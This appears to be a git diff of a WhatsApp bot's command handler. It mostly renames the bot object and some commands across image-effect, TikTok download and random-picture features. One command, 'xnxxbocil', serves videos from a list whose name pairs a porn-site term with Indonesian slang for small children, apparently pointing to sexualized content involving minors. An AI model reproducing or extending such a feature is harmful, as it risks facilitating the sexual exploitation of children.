+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'skeleton2':
@@ -2943,7 +2944,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'sketch':
@@ -2952,7 +2953,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'wonderful':
@@ -2961,7 +2962,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'batman':
@@ -2970,7 +2971,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'juice':
@@ -2979,7 +2980,7 @@ if(!q) throw `Use ${prefix + command} text`
 m.reply(mess.wait)
 maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
     `${q}`,])
-  .then((data) => ElgazarBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
+  .then((data) => Elza3emgonBot.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
   .catch((err) => console.log(err));
    break
 case 'pornhub':{
@@ -2992,7 +2993,7 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anuphub = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
 console.log(anuphub)
-ElgazarBot.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
+Elza3emgonBot.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
 }
 break
 case 'retro':{
@@ -3004,7 +3005,7 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anutro2 = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
 console.log(anutro2)
-ElgazarBot.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
+Elza3emgonBot.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
 }
 break
 case 'horror':{
@@ -3016,7 +3017,7 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anuror2 = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
 console.log(anuror2)
-ElgazarBot.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
+Elza3emgonBot.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
 }
 break
 case '8bit':{
@@ -3028,7 +3029,7 @@ inilogo9 = args.join(" ")
 var logo9 = inilogo9.split('|')[1]
     let anubit8 = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
 console.log(anubit8)
-ElgazarBot.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
+Elza3emgonBot.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
 }
 break
 case 'tiktok': case 'تيكتوك': { 
@@ -3037,7 +3038,7 @@ if (!q.includes('tiktok')) return m.reply(`الرابط خطأ!`)
 m.reply(mess.wait)
 require('./lib/tiktok').Tiktok(q).then( data => {
     var button = [{ buttonId: `tiktokaudio ${q}`, buttonText: { displayText: `صوتي‡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `الاوامر✨` }, type: 1 }]
-ElgazarBot.sendMessage(m.chat, { caption: `حقوق: ᴇʟɢᴀᴢᴀʀ_ᴀʟᴡᴀᴢᴇʀ`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
+Elza3emgonBot.sendMessage(m.chat, { caption: `حقوق: ᴇʟɢᴀᴢᴀʀ_ᴀʟᴡᴀᴢᴇʀ`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
 })
 }
 break
@@ -3046,7 +3047,7 @@ if (!text) return m.reply( `Example : ${prefix + command} link`)
 if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
 m.reply(mess.wait)
 require('./lib/tiktok').Tiktok(q).then( data => {
-ElgazarBot.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
 })
 }
 break
@@ -3055,304 +3056,304 @@ m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
 var hasil = pickRandom(asupan)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tiktokghea':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
 var hasil = pickRandom(gheayubi)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'xnxxbocil':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
 var hasil = pickRandom(bocil)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tiktoknukhty':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
 var hasil = pickRandom(ukhty)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tiktoksantuy':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
 var hasil = pickRandom(santuy)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tiktokkayes':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
 var hasil = pickRandom(kayes)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tiktokpanrika':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
 var hasil = pickRandom(rikagusriani)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'tiktoknotnot':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'chinese':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'hijab':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'indo':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'japanese':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'korean':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'malay':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'randomgirl':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'randomboy':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'thai':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'vietnamese':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'aesthetic':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'antiwork':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
-case 'blackpink':
+case 'gonpink':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
-var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
+var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/gonpink.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'bike':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'boneka':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'cosplay':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
-case 'قطه':
+case 'cat':
 m.reply(mess.wait)
-var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
+var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'doggo':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'hacking':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/hacking.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'justina':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'kayes':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
-case 'كيبوب':
+case 'kpop':
 m.reply(mess.wait)
-var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
+var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'notnot':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
-case 'سياره':
+case 'car':
 m.reply(mess.wait)
-var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
+var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'couplepic':case 'couplepicture':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'profilepic':  case 'خلفيات':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ببجي':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'rose':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ryujin':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ulzzangboy':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ulzzanggirl':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'wallml': case 'wallpaperml':case 'mobilelegend':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 case 'ويلبر': case 'wallphone':
 m.reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "التالي➡️" }, type: 1 }]
 var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
 var hasil = pickRandom(notnot)
-ElgazarBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
 break
 
 case 'rentbot': {
 if (!isPremium) return sendButMessage (m.chat, prem1, prem2, prem3, { quoted:m})
-jadibot(ElgazarBot, m, m.chat)
+jadibot(Elza3emgonBot, m, m.chat)
 }
 break
 case 'rentbotlist':
 try {
-let user = [... new Set([...global.conns.filter(ElgazarBot => ElgazarBot.user).map(ElgazarBot => ElgazarBot.user)])]
+let user = [... new Set([...global.conns.filter(Elza3emgonBot => Elza3emgonBot.user).map(Elza3emgonBot => Elza3emgonBot.user)])]
 te = "*Bot Rent List*\n\n"
 for (let i of user){
-let y = await ElgazarBot.decodeJid(i.id)
+let y = await Elza3emgonBot.decodeJid(i.id)
 te += " × User : @" + y.split("@")[0] + "\n"
 te += " × Name : " + i.name + "\n\n"
 }
-ElgazarBot.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
+Elza3emgonBot.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
 } catch (err) {
 m.reply(`There are no users who have rented bot yet`)
 }
@@ -3365,43 +3366,43 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     repo = repo.replace(/.git$/, '')
     let url = `https://api.github.com/repos/${user}/${repo}/zipball`
     let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
-    ElgazarBot.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
+    Elza3emgonBot.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
 break
 	        case 'pinterest': {
 m.reply(mess.wait)
 let { pinterest } = require('./lib/scraper')
 anutrest = await pinterest(text)
 result = anutrest[Math.floor(Math.random() * anutrest.length)]
-ElgazarBot.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
 }
 break
         case 'ringtone': {
-		if (!text) throw `Example : ${prefix + command} black rover`
+		if (!text) throw `Example : ${prefix + command} gon rover`
         let { ringtone } = require('./lib/scraper')
 		let anutone2 = await ringtone(text)
 		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
